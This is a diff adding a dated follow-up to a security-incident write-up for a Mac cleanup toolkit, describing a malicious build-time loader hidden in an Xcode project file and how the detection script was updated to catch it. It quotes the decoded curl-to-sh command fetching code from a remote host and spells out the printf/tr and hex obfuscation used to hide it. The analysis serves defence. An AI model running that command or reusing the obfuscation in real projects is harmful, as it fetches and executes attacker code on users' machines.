@@ -181,7 +181,7 @@ The corrected cleanup now records and terminates the temporary AppleScript/nativ
 Recommended periodic local check:
 
 ```bash
-cd ~/Desktop/new
+cd ~/Desktop/mac-setup-security-toolkit
 ./cleanup_security_incident.sh check
 ```
 
@@ -190,3 +190,34 @@ If the check report shows the same indicators again, run:
 ```bash
 ./cleanup_security_incident.sh clean --system
 ```
+
+## 2026-10-12 Follow-up: Obfuscated Xcode `project.pbxproj` Variant
+
+### Finding
+
+`ResmartHealth` on `~/Desktop` contained a build-time loader that the June toolkit patterns **missed**:
+
+- Fake Run Script phase `Provision Library Executable` → `sh -c "${A3EA261}"`
+- Debug/Release setting `A3EA261` using `` `printf xx3d | tr -d 3` `` to assemble `xxd`, then hex-decoding into:
+
+```bash
+echo "$(curl --connect-timeout 23 -Lksf --retry 3 -d "p=xcode_phase" https://jhqt34n3qreu.ru/a)" | sh
+```
+
+Implant commit on `main`: `3b734b7` (`[update]优化返回“401 Authorization Required”问题`), which mixed a real 401 networking fix with the malicious `pbxproj` change.
+
+### Why the old script missed it
+
+Detection was keyed on literal `xxd -p -r`, plaintext `curl ...| sh`, and fixed setting names `A3DC1C3`/`AF17F99`. The variant hid the decoder and curl command behind `printf|tr` + hex, with a rotating setting id (`A3EA261`, earlier `A870EE4`).
+
+### Toolkit fix
+
+`cleanup_security_incident.sh` now matches and removes this family by behavior (obfuscated xxd, long hex|sh, `p=xcode_phase`/`p=xcode_rule`, `sh -c "${SETTING}"` wrappers referencing malicious settings), while keeping legacy IOCs.
+
+### Working tree vs Git branches
+
+- `./cleanup_security_incident.sh clean` cleared the **current working tree** `project.pbxproj` (verified clean on disk).
+- Committed `HEAD`/`origin/main` and several other remote branches still contain the IOC until a cleanup commit is made and those branches are updated.
+- Branches that already removed similar scripts (e.g. `origin/dev/sept`) stayed clean in a `git grep` sweep.
+
+Full Chinese write-up: `XCODE_PBXPROJ_INCIDENT_2026-10.md`.
